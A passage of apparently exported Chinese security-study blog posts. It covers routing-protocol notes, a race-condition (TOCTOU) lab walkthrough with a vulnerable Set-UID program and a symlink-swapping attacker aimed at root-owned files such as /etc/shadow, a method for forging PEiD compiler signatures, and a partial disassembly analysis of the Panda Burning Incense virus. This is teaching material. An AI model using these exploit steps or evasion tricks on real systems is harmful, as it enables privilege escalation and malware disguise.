<p>14、ARP高速缓存项目设置更新时间是由于避免网络中IP地址和硬件地址的映射发生变化时，ARP高速缓存中的相应项目也需要变化。一般时间是10-20分钟，设置过短会导致网络中ARP请求和响应的通信量太过频繁，过长会使更换网卡后的主机长时间无法和网络上的主机进行通信。 </p>
<p>15、RIP协议处于UDP协议的上层，RIP所接收到的路由信息否封装在UDP的数据报中；OSPF的位置位于网络层，由于交换的信息较大，应使报文长度短，采用IP；BGP要在不同的自治系统之间交换路由信息，保证可靠传输，选择TCP。</p>
<p>BGP不用周期性地与相邻路由器进行路由信息交换：</p>
<p>(1)、由于因特网规模导致自治系统之间的路由选择非常困难。</p>
<p>(2)、自治系统之间路由选择寻找最佳路由不现实。</p>
<p>(3)、自治系统之间路由选择考虑有关策略。</p>
<p>16、路由表更新规则：</p>
<p>无新信息，不改变</p>
<p>同一个项目相同下一跳，更新</p>
<p>新的项目，添加</p>
<p>不同下一跳，距离更短，更新</p>
<p>不同下一跳，距离一样，不改变。</p>
<p>17、隧道技术：当多播数据报在传输数据中遇到不允许多播路由器的网络，路由器对多播数据报进行再次封装进行传输。通过隧道后经路由器剥去收取回复多播数据报，对多个站进行转发。</p>
]]></content>
      <categories>
        <category>计网</category>
        <category>TCP/IP</category>
      </categories>
      <tags>
        <tag>-计算机网络 -网络层</tag>
      </tags>
  </entry>
  <entry>
    <title>蓝桥杯之竞态条件漏洞</title>
    <url>/2023/12/14/%E8%93%9D%E6%A1%A5%E6%9D%AF%E4%B9%8B%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="蓝桥杯之竞态条件漏洞"><a href="#蓝桥杯之竞态条件漏洞" class="headerlink" title="蓝桥杯之竞态条件漏洞"></a>蓝桥杯之竞态条件漏洞</h1><h2 id="竞态条件漏洞"><a href="#竞态条件漏洞" class="headerlink" title="竞态条件漏洞"></a>竞态条件漏洞</h2><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>在开始之前需要保证实验环境关闭了针对竞态条件攻击的保护</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo su</span><br><span class="line">$ echo 0 &gt; /proc/sys/fs/protected_symlinks</span><br><span class="line">$ exit</span><br></pre></td></tr></table></figure>

<p>需要拥有root权限</p>
<h3 id="重写root拥有者的文件"><a href="#重写root拥有者的文件" class="headerlink" title="重写root拥有者的文件"></a>重写root拥有者的文件</h3><p>这里新建两个目标文件root_file和append_text</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo touch root_file </span><br><span class="line">$ sudo chmod g+w root_file</span><br></pre></td></tr></table></figure>

<img src="/2023/12/14/%E8%93%9D%E6%A1%A5%E6%9D%AF%E4%B9%8B%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20231214215523221.png" class title="image-20231214215523221">

<p>在append_text文件中写入任意内容，这里写入”This is a flag!”</p>
<img src="/2023/12/14/%E8%93%9D%E6%A1%A5%E6%9D%AF%E4%B9%8B%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20231214215145293.png" class title="image-20231214215145293">

<p>新建的三个文件结构及其权限如下</p>
<img src="/2023/12/14/%E8%93%9D%E6%A1%A5%E6%9D%AF%E4%B9%8B%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20231214220339605.png" class title="image-20231214220339605">

<p>exp代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* vulp.c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELAY 10000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> * fn = <span class="string">&quot;/tmp/XYZ&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">60</span>];</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">/* get user input */</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%50s&quot;</span>, buffer );</span><br><span class="line">    <span class="keyword">if</span>(!access(fn, W_OK))&#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; DELAY; i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> a = i^<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        fp = fopen(fn, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">        fwrite(<span class="string">&quot;\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), <span class="number">1</span>, fp);</span><br><span class="line">        fwrite(buffer, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), <span class="built_in">strlen</span>(buffer), fp);</span><br><span class="line">        fclose(fp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;No permission \n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是一个 Set-UID 程序(root所有) 它将用户输入的字符串添加到文件 &#x2F;tmp&#x2F;XYZ 后，access() 会检查用户是否具备访问资源的权限，也就是说该函数检查real id而不是effective id。由于代码首先使用access查看文件是否有写权限，然后再使用fopen去访问目标文件写入数据，由于存在的时间差而导致可能存在条件竞态漏洞。在程序检测完&#x2F;tmp&#x2F;XYZ这个文件后的时间差里面如果链接&#x2F;tep&#x2F;XYZ到&#x2F;etc&#x2F;shadow，则可以直接写入。</p>
<p>编译vulp.c文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc vulp.c -o vylp</span><br></pre></td></tr></table></figure>

<p>创建检查时间戳脚本check.sh，将append_text的内容读进vulp，并且链接到root_file文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">#注意`不是单引号</span><br><span class="line">old=`ls -l /home/shiyanlou/seed/root_file`</span><br><span class="line">new=`ls -l /home/shiyanlou/seed/root_file`</span><br><span class="line">while [ &quot;$old&quot; = &quot;$new&quot; ]</span><br><span class="line">do</span><br><span class="line">    ./vulp &lt; append_text</span><br><span class="line">    new=`ls -l /home/shiyanlou/seed/root_file`</span><br><span class="line">done</span><br><span class="line">echo &quot;STOP... The file has been changed&quot;</span><br></pre></td></tr></table></figure>

<p>创建攻击代码attacker.c并编译</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        system(<span class="string">&quot;ln -sf /home/shiyanlou/seed/tmp_file /tmp/XYZ&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;ln -sf /home/shiyanlou/seed/root_file /tmp/XYZ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后所有创建的文件如下</p>
<img src="/2023/12/14/%E8%93%9D%E6%A1%A5%E6%9D%AF%E4%B9%8B%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20231215091347608.png" class title="image-20231215091347608">

<p>先运行attacker，在运行check.sh</p>
<img src="/2023/12/14/%E8%93%9D%E6%A1%A5%E6%9D%AF%E4%B9%8B%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20231215093126499.png" class title="image-20231215093126499">

<h3 id="获取root权限"><a href="#获取root权限" class="headerlink" title="获取root权限"></a>获取root权限</h3><p>在passwd文件和shadow文件中添加指定格式，新建账户和密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkpasswd -m sha-512 revolc</span><br></pre></td></tr></table></figure>

<img src="/2023/12/14/%E8%93%9D%E6%A1%A5%E6%9D%AF%E4%B9%8B%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20231215093350785.png" class title="image-20231215093350785">
]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>竞态条件漏洞</category>
      </categories>
      <tags>
        <tag>-蓝桥杯 -竞态条件</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向分析技术应用-PEID的工作原理</title>
    <url>/2023/03/01/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%BA%94%E7%94%A8-PEID%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<h1 id="逆向分析技术应用-PEID的工作原理"><a href="#逆向分析技术应用-PEID的工作原理" class="headerlink" title="逆向分析技术应用-PEID的工作原理"></a>逆向分析技术应用-PEID的工作原理</h1><p>PEID是一款很好的PE文件分析工具，对于标准的PE文件，PEID可以分析出它是哪款编译器生成的等信息。</p>
<p>使用PEID打开生成的实例文件，得到生成PE文件编译器版本</p>
<img src="/2023/03/01/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%BA%94%E7%94%A8-PEID%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20230310095957252.png" class title="image-20230310095957252">



<p>图中的”Microsoft Visual C++5.0”是一个字符串信息，这个字符串信息一般不会是由PE文件提供的。</p>
<h2 id="环境识别"><a href="#环境识别" class="headerlink" title="环境识别"></a>环境识别</h2><p>PEID解析编译器版本流程：</p>
<ul>
<li>读取分析oep地址偏移，并修正oep</li>
<li>再次检查oep地址合法性</li>
<li><strong>将oep处的机器码与特征码进行比较</strong></li>
<li>检查分析文件中是否存在”.rdata”节</li>
<li>根据分析结果获得对应处理函数所在数组的下标并保存</li>
<li>循环调用处理函数</li>
<li>在处理函数中再次检查</li>
<li>显示编译器版本</li>
</ul>
<h2 id="环境伪造"><a href="#环境伪造" class="headerlink" title="环境伪造"></a>环境伪造</h2><p>在环境识别过程中，最重要的是oep地址相关的机器码与特征码相匹配，所以伪造时需要伪造机器码。</p>
<ul>
<li>伪造的ope在”.text”节指定范围内将对比机器码填入其中，并在伪造ope结尾处将程序重新调整为真正的ope处，使其可以正常运行。</li>
<li>检查伪造程序中是否存在”.rdata”节，若不存在需添加。</li>
</ul>
]]></content>
      <categories>
        <category>逆向分析</category>
        <category>C/C++</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>-逆向 -C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向分析技术应用-“熊猫烧香”病毒</title>
    <url>/2023/03/12/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%BA%94%E7%94%A8-%E2%80%9C%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E2%80%9D%E7%97%85%E6%AF%92/</url>
    <content><![CDATA[<h1 id="逆向分析技术应用-“熊猫烧香”病毒"><a href="#逆向分析技术应用-“熊猫烧香”病毒" class="headerlink" title="逆向分析技术应用-“熊猫烧香”病毒"></a>逆向分析技术应用-“熊猫烧香”病毒</h1><p>我们使用PEID对病毒样本分析后发现，这个病毒程序由Borland Delphi 6.0-7.0所编写的，这个编译器与VC编译器编写代码不同的是使用register方式传递函数参数。</p>
<img src="/2023/03/12/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%BA%94%E7%94%A8-%E2%80%9C%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E2%80%9D%E7%97%85%E6%AF%92/image-20230312090510591.png" class title="image-20230312090510591">

<h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>病毒样本oep处的代码片段，这是由Delphi编译器生成的</p>
<img src="/2023/03/12/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%BA%94%E7%94%A8-%E2%80%9C%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E2%80%9D%E7%97%85%E6%AF%92/image-20230312091741961.png" class title="image-20230312091741961">



<p>病毒代码功能代码如下</p>
<img src="/2023/03/12/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%BA%94%E7%94%A8-%E2%80%9C%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E2%80%9D%E7%97%85%E6%AF%92/image-20230312092533170.png" class title="image-20230312092533170">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov     eax, offset byte_40F7D4 ;保存字符串</span><br><span class="line">mov     edx, offset word_40D1D8 ;病毒作者字符串</span><br><span class="line">call    sub_403C98 </span><br><span class="line">;cpystringStack函数，首先完成堆空间的申请，将edx的字符串保存到申请的堆空间中</span><br><span class="line"></span><br><span class="line">下面都是相同操作，将字符串保存到栈中</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea     ecx, [ebp-14h]</span><br><span class="line">mov     edx, offset byte_40D260</span><br><span class="line">;用于还原加密字符串</span><br><span class="line">mov     eax, offset dword_40D270</span><br><span class="line">;保存解密字符串</span><br><span class="line">call    sub_405360</span><br><span class="line">;对加密字符串进行解密</span><br><span class="line">mov     edx, [ebp-14h]</span><br><span class="line">;将解密后的字符串首地址存入edx</span><br><span class="line">mov     eax, ds:dword_40F7D4</span><br><span class="line">;保存字符串首地址指针</span><br><span class="line"> call    sub_404018</span><br><span class="line"> jz      short loc_40D149</span><br><span class="line">push    0</span><br><span class="line">call    ExitProcess_0</span><br><span class="line">jmp     short loc_40D19A</span><br><span class="line">;比较edx和eax中的两个字符串，跳转失败则退出程序</span><br></pre></td></tr></table></figure>



<p>上面的代码是程序的校验部分，包含作者以及作者提供帮助的相关人员的信息。验证成功后，会进入病毒启动部分，即loc_40D149地址处。</p>
<img src="/2023/03/12/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%BA%94%E7%94%A8-%E2%80%9C%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E2%80%9D%E7%97%85%E6%AF%92/image-20230312095055861.png" class title="image-20230312095055861">

<p>这里的代码和上面的验证一样，再次验证程序是否为病毒程序。若通过验证，则调用CreateAndRunPanda、InfectOtherFile、VirusProtect这三个函数来完成病毒的运行、感染和病毒自我保护。</p>
<img src="/2023/03/12/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%BA%94%E7%94%A8-%E2%80%9C%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E2%80%9D%E7%97%85%E6%AF%92/image-20230312114238904.png" class title="image-20230312114238904">



<h2 id="启动过程"><a href="#启动过程" class="headerlink" title="启动过程"></a>启动过程</h2><p>启动函数CreateAndRunPanda()代码1如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CODE:004082F8 CreateAndRunPanda proc near             ; CODE XREF: CODE:loc_40D173p</span><br><span class="line">CODE:004082F8</span><br><span class="line">CODE:004082F8 var_424         = dword ptr -424h</span><br><span class="line">CODE:004082F8 var_420         = dword ptr -420h</span><br><span class="line">CODE:004082F8 var_41C         = dword ptr -41Ch</span><br><span class="line">CODE:004082F8 var_418         = dword ptr -418h</span><br><span class="line">CODE:004082F8 uCmdShow        = dword ptr -414h</span><br><span class="line">CODE:004082F8 var_410         = dword ptr -410h</span><br><span class="line">CODE:004082F8 var_40C         = dword ptr -40Ch</span><br><span class="line">CODE:004082F8 var_408         = dword ptr -408h</span><br><span class="line">CODE:004082F8 var_404         = dword ptr -404h</span><br><span class="line">CODE:004082F8 var_400         = dword ptr -400h</span><br><span class="line">CODE:004082F8 var_3FC         = dword ptr -3FCh</span><br><span class="line">CODE:004082F8 var_3F8         = dword ptr -3F8h</span><br><span class="line">CODE:004082F8 var_3F4         = dword ptr -3F4h</span><br><span class="line">CODE:004082F8 var_3F0         = dword ptr -3F0h</span><br><span class="line">CODE:004082F8 var_3EC         = dword ptr -3ECh</span><br><span class="line">CODE:004082F8 var_3E8         = dword ptr -3E8h</span><br><span class="line">CODE:004082F8 var_3E4         = dword ptr -3E4h</span><br><span class="line">CODE:004082F8 var_3E0         = dword ptr -3E0h</span><br><span class="line">CODE:004082F8 var_3DC         = dword ptr -3DCh</span><br><span class="line">CODE:004082F8 var_3D8         = dword ptr -3D8h</span><br><span class="line">CODE:004082F8 var_3D4         = dword ptr -3D4h</span><br><span class="line">CODE:004082F8 var_3D0         = dword ptr -3D0h</span><br><span class="line">CODE:004082F8 var_3CC         = dword ptr -3CCh</span><br><span class="line">CODE:004082F8 var_3C8         = dword ptr -3C8h</span><br><span class="line">CODE:004082F8 var_3C4         = dword ptr -3C4h</span><br><span class="line">CODE:004082F8 var_3C0         = dword ptr -3C0h</span><br><span class="line">CODE:004082F8 var_3BC         = dword ptr -3BCh</span><br><span class="line">CODE:004082F8 var_3B8         = dword ptr -3B8h</span><br><span class="line">CODE:004082F8 var_3B4         = dword ptr -3B4h</span><br><span class="line">CODE:004082F8 var_3B0         = byte ptr -3B0h</span><br><span class="line">CODE:004082F8 var_1E4         = byte ptr -1E4h</span><br><span class="line">CODE:004082F8 var_18          = dword ptr -18h</span><br><span class="line">CODE:004082F8 var_14          = dword ptr -14h</span><br><span class="line">CODE:004082F8 var_10          = dword ptr -10h</span><br><span class="line">CODE:004082F8 var_C           = dword ptr -0Ch</span><br><span class="line">CODE:004082F8 var_8           = dword ptr -8</span><br><span class="line">CODE:004082F8 var_4           = dword ptr -4</span><br><span class="line">;函数入口起始处</span><br><span class="line">CODE:004082F8</span><br><span class="line">CODE:004082F8                 push    ebp</span><br><span class="line">CODE:004082F9                 mov     ebp, esp</span><br><span class="line">CODE:004082FB                 mov     ecx, 84h</span><br><span class="line">CODE:00408300</span><br><span class="line">;地址标号</span><br><span class="line">CODE:00408300 loc_408300:                             ; CODE XREF: CreateAndRunPanda+Dj</span><br><span class="line">CODE:00408300                 push    0</span><br><span class="line">CODE:00408302                 push    0</span><br><span class="line">CODE:00408304                 dec     ecx</span><br><span class="line">;申请局部变量空间</span><br><span class="line">CODE:00408305                 jnz     short </span><br><span class="line">loc_408300</span><br><span class="line">;循环跳转，共申请0x84次，每次申请8字节栈空间</span><br><span class="line">CODE:00408307                 push    ecx</span><br><span class="line">CODE:00408308                 push    ebx</span><br><span class="line">CODE:00408309                 push    esi</span><br><span class="line">CODE:0040830A                 push    edi</span><br><span class="line">CODE:0040830B                 xor     eax, eax</span><br><span class="line">CODE:0040830D                 push    ebp</span><br><span class="line">CODE:0040830E                 push    offset loc_4088DD</span><br><span class="line">CODE:00408313                 push    dword ptr fs:[eax]</span><br><span class="line">CODE:00408316                 mov     fs:[eax], esp</span><br><span class="line">CODE:00408319                 lea     edx, [ebp+var_3B8]</span><br><span class="line">;保存路径字符串首地址</span><br><span class="line">CODE:0040831F                 xor     eax, eax</span><br><span class="line">CODE:00408321                 call    sub_40277C</span><br><span class="line">;调用GetPath函数获取路径</span><br><span class="line">CODE:00408326                 mov     eax, [ebp+var_3B8]</span><br><span class="line">CODE:0040832C                 lea     edx, [ebp+var_3B4]</span><br><span class="line"></span><br><span class="line">CODE:00408332                 call    sub_405684</span><br><span class="line">;调用函数，字符串追加函数</span><br><span class="line">CODE:00408337                 lea     eax, [ebp+var_3B4]</span><br><span class="line">CODE:0040833D                 mov     edx, offset dword_4088F4</span><br><span class="line">;字符串&quot;Desktop_ini&quot;的首地址</span><br><span class="line">CODE:00408342                 call    sub_403ED4</span><br><span class="line">;调用字符串追加函数</span><br><span class="line">CODE:00408347                 mov     eax, [ebp+var_3B4]</span><br><span class="line">;追加后的首地址</span><br><span class="line">CODE:0040834D                 call    sub_4057A4</span><br><span class="line">;检查“Desktop_.ini”文件是否存在</span><br><span class="line">CODE:00408352                 test    al, al</span><br><span class="line">;不存在al=0</span><br><span class="line">CODE:00408354                 jz      loc_4083E4</span><br><span class="line">;不存在执行跳转</span><br><span class="line">CODE:0040835A                 push    80h             ; dwFileAttributes</span><br><span class="line">;获取路径长度</span><br><span class="line">CODE:0040835F                 lea     edx, [ebp+var_3C0]</span><br><span class="line">;保存路径字符串首地址</span><br><span class="line">CODE:00408365                 xor     eax, eax</span><br><span class="line">CODE:00408367                 call    sub_40277C</span><br><span class="line">;获取当前路径</span><br><span class="line">CODE:0040836C                 mov     eax, [ebp+var_3C0]</span><br><span class="line">CODE:00408372                 lea     edx, </span><br><span class="line">[ebp+var_3BC]</span><br><span class="line">;保存路径字符串首地址</span><br><span class="line">CODE:00408378                 call    sub_405684</span><br><span class="line">;获取路径</span><br><span class="line">CODE:0040837D                 lea     eax, [ebp+var_3BC]</span><br><span class="line">CODE:00408383                 mov     edx, offset dword_4088F4</span><br><span class="line">CODE:00408388                 call    sub_403ED4</span><br><span class="line">CODE:0040838D                 mov     eax, [ebp+var_3BC]</span><br><span class="line">CODE:00408393                 call    sub_4040CC</span><br><span class="line">CODE:00408398                 push    eax             ; lpFileName</span><br><span class="line">CODE:00408399                 call    SetFileAttributesA</span><br><span class="line">;设置文件属性</span><br><span class="line">CODE:0040839E                 push    1               ; dwMilliseconds</span><br><span class="line">;设置等待时间</span><br><span class="line">CODE:004083A0                 call    Sleep</span><br><span class="line">CODE:004083A5                 lea     edx, [ebp+var_3C8]</span><br><span class="line">CODE:004083AB                 xor     eax, eax</span><br><span class="line">CODE:004083AD                 call    sub_40277C</span><br><span class="line">CODE:004083B2                 mov     eax, [ebp+var_3C8]</span><br><span class="line">CODE:004083B8                 lea     edx, [ebp+var_3C4]</span><br><span class="line">CODE:004083BE                 call    sub_405684</span><br><span class="line">CODE:004083C3                 lea     eax, [ebp+var_3C4]</span><br><span class="line">CODE:004083C9                 mov     edx, offset dword_4088F4</span><br><span class="line">CODE:004083CE                 call    sub_403ED4</span><br><span class="line">CODE:004083D3                 mov     eax, [ebp+var_3C4]</span><br><span class="line">CODE:004083D9                 call    sub_4040CC</span><br><span class="line">;检查字符串文件</span><br><span class="line">CODE:004083DE                 push    eax             ; lpFileName</span><br><span class="line">;压入路径字符串</span><br><span class="line">CODE:004083DF                 call    DeleteFileA</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>上述代码主要获取当前路径，并将”Desktop_.ini”拼接到当前路径中，同时检查此文件是否存在。如果文件存在，则将其删除。在执行完这些指令后，代码进入新的流程。</p>
<p>代码片段2如下</p>
<img src="/2023/03/12/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%BA%94%E7%94%A8-%E2%80%9C%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E2%80%9D%E7%97%85%E6%AF%92/image-20230312153359868.png" class title="image-20230312153359868">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CODE:004083E4 loc_4083E4:                             ; CODE XREF: CreateAndRunPanda+5Cj</span><br><span class="line">CODE:004083E4                 lea     edx, [ebp+var_3CC]</span><br><span class="line">CODE:004083EA                 xor     eax, eax</span><br><span class="line">CODE:004083EC                 call    sub_40277C</span><br><span class="line">;获取全路径，将首地址保存到[ebp+var_3CC]</span><br><span class="line">CODE:004083F1                 mov     eax, [ebp+var_3CC]</span><br><span class="line">CODE:004083F7                 lea     edx, [ebp+var_4]</span><br><span class="line">;保存当前文件信息的首地址</span><br><span class="line">CODE:004083FA                 call    sub_407760</span><br><span class="line">;根据路径，将当前程序读取到内存中，使用[ebp+var_4]保存其首地址</span><br><span class="line">CODE:004083FF                 lea     eax, [ebp+var_8]</span><br><span class="line">CODE:00408402                 call    sub_403C44</span><br><span class="line">CODE:00408407                 mov     eax, [ebp+var_4]</span><br><span class="line">;获取文件大小，Delphi编写的，字符串首地址减去4后，取出的4字节内容便是此字符串的长度</span><br><span class="line">CODE:0040840A                 call    sub_403ECC</span><br><span class="line">CODE:0040840F                 mov     ebx, eax</span><br><span class="line">CODE:00408411                 jmp     short loc_408437</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上述代码就是完成将病毒文件信息读取到内存中的操作，其目的是复制病毒信息，感染其他文件。接下来看下其调用函数。</p>
<img src="/2023/03/12/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%BA%94%E7%94%A8-%E2%80%9C%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E2%80%9D%E7%97%85%E6%AF%92/image-20230312154035559.png" class title="image-20230312154035559">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CODE:00408437 loc_408437:                             ; CODE XREF: CreateAndRunPanda+119j</span><br><span class="line">CODE:00408437                 test    ebx, ebx</span><br><span class="line">;检查字符串长度</span><br><span class="line">CODE:00408439                 jle     short loc_408445</span><br><span class="line">;判断标记信息，没有标记表明是第一次运行则跳转，否则就执行下面的语句</span><br><span class="line">CODE:0040843B                 mov     eax, [ebp+var_4]</span><br><span class="line">;获取文件在内存中的首地址</span><br><span class="line">CODE:0040843E                 cmp     byte ptr [eax+ebx-1], 0</span><br><span class="line">;判断文件尾数据是否为0，这是感染过的文件标记。如果没有被感染，则跳转失败。</span><br><span class="line">CODE:00408443                 jnz     short loc_408413</span><br></pre></td></tr></table></figure>

<p>上述代码进行了标记检查工作，以判断病毒程序是否被多次运行，同时设置了相关的标记信息。</p>
<p>接下来，程序流程进入病毒程序复制处，”spcolsv.exe”在进程中出现，代码如下。</p>
<img src="/2023/03/12/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%BA%94%E7%94%A8-%E2%80%9C%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E2%80%9D%E7%97%85%E6%AF%92/image-20230312155504300.png" class title="image-20230312155504300">

<p>上述代码操作就是找到进程中运行的”spcolsv.exe”并将其终止，在系统目录中删除”spcolsv.exe”，将病毒自身伪造程”spcolsv.exe”并启动。启动系统目录中伪造的病毒程序后，病毒程序已经在系统目录下，并且已经伪造成spcolsv。</p>
<p>在”004084B7 call CmpStr”代码后，程序会进入地址标号loc_4085BA处，如下图</p>
<img src="/2023/03/12/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%BA%94%E7%94%A8-%E2%80%9C%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E2%80%9D%E7%97%85%E6%AF%92/image-20230312160129032.png" class title="image-20230312160129032">

<p>检查病毒文件已经在系统目录下后，则会执行上述代码，释放之前申请存放病毒文件信息的内存，并跳转loc_40889D获取标记信息。</p>
<p>loc_40889D代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CODE:0040889D loc_40889D:                             ; CODE XREF: CreateAndRunPanda+2D6j</span><br><span class="line">CODE:0040889D                 mov     edx, [ebp+var_8]</span><br><span class="line">;获取对比标记信息</span><br><span class="line">CODE:004088A0                 mov     eax, offset dword_408934</span><br><span class="line">;获取数值标记1</span><br><span class="line">CODE:004088A5                 call    sub_4041B4</span><br><span class="line">;调用函数查询标记值1，并获取其位置</span><br><span class="line">CODE:004088AA                 test    eax, eax</span><br><span class="line">CODE:004088AC                 jg      loc_4085D3</span><br><span class="line">;如果查找到标记字符，则跳转到loc_4085D3地址处</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上述代码主要是获取标记并进行检查，当标记等于数值为1时，会进入loc_4085D3地址处代码，并进行进一步检查。</p>
<img src="/2023/03/12/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%BA%94%E7%94%A8-%E2%80%9C%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E2%80%9D%E7%97%85%E6%AF%92/image-20230312163958147.png" class title="image-20230312163958147">

<p>上述代码功能是将被感染的文件进行分离，提取出原始文件信息。由于感染文件时预留了相关的标记信息，根据这些信息得到原始文件。文件感染后分为三个部分，<strong>病毒代码+原始程序+标记信息</strong>。</p>
<p>将感染文件进行分离后，会在程序所在目录下释放出一个原始文件，感染文件的主要工作是维护进程中伪造的病毒程序”spcolsv.exe”程序，如果这个程序被处理掉，则会从感染的文件中分离出病毒程序，程序再次运行。</p>
<img src="/2023/03/12/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%BA%94%E7%94%A8-%E2%80%9C%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E2%80%9D%E7%97%85%E6%AF%92/image-20230312164151443.png" class title="image-20230312164151443">



<h2 id="感染过程"><a href="#感染过程" class="headerlink" title="感染过程"></a>感染过程</h2><p>第二个重要的函数infectOtherFile()，这是病毒的感染函数，函数实现如下</p>
